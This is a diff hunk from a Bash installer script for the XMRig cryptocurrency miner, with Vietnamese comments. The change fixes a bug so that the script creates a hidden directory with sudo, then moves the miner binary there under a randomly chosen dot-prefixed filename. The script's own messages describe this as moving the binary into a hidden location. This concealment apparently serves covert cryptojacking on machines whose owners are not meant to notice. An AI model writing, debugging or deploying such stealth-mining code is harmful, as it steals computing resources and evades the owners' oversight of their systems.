@@ -702,9 +702,21 @@ done
 echo "Đã tạo các file cấu hình XMRig."
 
 echo "Di chuyển XMRig binary vào vị trí ẩn..."
+# Xác định tên file nhị phân ngẫu nhiên và đường dẫn đầy đủ
+RANDOM_BIN_NAME_FOR_XMRIG_FILE=${BIN_NAMES[$RANDOM % ${#BIN_NAMES[@]}]}
+MINER_ACTUAL_PATH="$MINER_DIR/.$RANDOM_BIN_NAME_FOR_XMRIG_FILE.bin" 
+
+# Lấy thư mục chứa file nhị phân (có thể là một thư mục ẩn)
+MINER_BIN_PARENT_DIR=$(dirname "$MINER_ACTUAL_PATH")
+
+# Tạo thư mục cha nếu nó chưa tồn tại (đây là sửa lỗi chính)
+if [ ! -d "$MINER_BIN_PARENT_DIR" ]; then
+    sudo mkdir -p "$MINER_BIN_PARENT_DIR"
+    sudo chown "$USER":"$USER" "$MINER_BIN_PARENT_DIR"
+    echo "Đã tạo thư mục ẩn: $MINER_BIN_PARENT_DIR"
+fi
+
 if [ -f "$MINER_ORIGINAL_NAME" ]; then
-    RANDOM_BIN_NAME_FOR_XMRIG_FILE=${BIN_NAMES[$RANDOM % ${#BIN_NAMES[@]}]}
-    MINER_ACTUAL_PATH="$MINER_DIR/.$RANDOM_BIN_NAME_FOR_XMRIG_FILE.bin" 
     mv "$MINER_ORIGINAL_NAME" "$MINER_ACTUAL_PATH"
     chmod +x "$MINER_ACTUAL_PATH"
     echo "Đã di chuyển XMRig binary."
